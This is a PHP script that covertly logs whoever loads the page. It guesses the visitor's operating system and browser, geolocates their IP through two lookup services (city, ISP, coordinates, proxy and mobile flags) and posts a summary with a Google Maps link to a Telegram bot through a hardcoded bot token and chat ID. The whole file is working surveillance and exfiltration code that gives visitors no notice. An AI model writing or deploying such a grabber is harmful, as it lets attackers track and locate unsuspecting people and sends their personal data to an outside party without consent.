<?php
// PHP logic here

$mach = '';
$nav = '';
$timezone = '';

if (strpos($_SERVER['HTTP_USER_AGENT'], 'Windows') !== false) {
    $mach = 'Windows';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Ubuntu') !== false) {
    $mach = 'Ubuntu';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Kali') !== false) {
    $mach = 'Kali';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false) {
    $mach = 'Android';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') !== false) {
    $mach = 'iOS';
} else {
    $mach = 'Other';
}

if (strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== false) {
    $nav = 'Chrome';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') !== false) {
    $nav = 'Safari';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Edge') !== false) {
    $nav = 'Edge';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox') !== false) {
    $nav = 'Mozilla';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Opera') !== false) {
    $nav = 'Opera';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Tor') !== false) {
    $nav = 'Tor';
} else {
    $nav = 'Other';
}

// Get client IP
$PublicIP = get_client_ip();

// Get geolocation data
$json1 = file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json1 = json_decode($json1, true);

$json = file_get_contents("http://ip-api.com/json/$PublicIP?fields=query,continent,country,countryCode,regionName,city,zip,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting");
$json = json_decode($json, true);

$loc = $json1['loc'];
$country = $json1['countryCode'] . ', ' . $json['regionName'] . ', ' . $json['city'];
$zip = $json['isp'];
$timezone = $json['timezone'];

$msg = "-----{===--{ Nevo Info }--===}-----" . "\n\n" . "Your IP : " . $PublicIP . "\n\n" . "Your APP & Device : " . $mach . '/' . $nav . "\n\n" . "Your address : " . $country . "\n\n" . "Your Provider : " . $zip . "\n\n" . "Your Location : http://www.google.com/maps/place/" . $loc . "\n\n" . "Your Time Now Is :" . $timezone . "\n\n" ."-----{===--{ Nevo Info }--===}-----";

$bot_id = "-1001874783762";
$url = 'https://api.telegram.org/bot6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY/sendMessage';

$data = [
    'chat_id' => $bot_id,
    'text' => $msg
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
    ],
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
?>
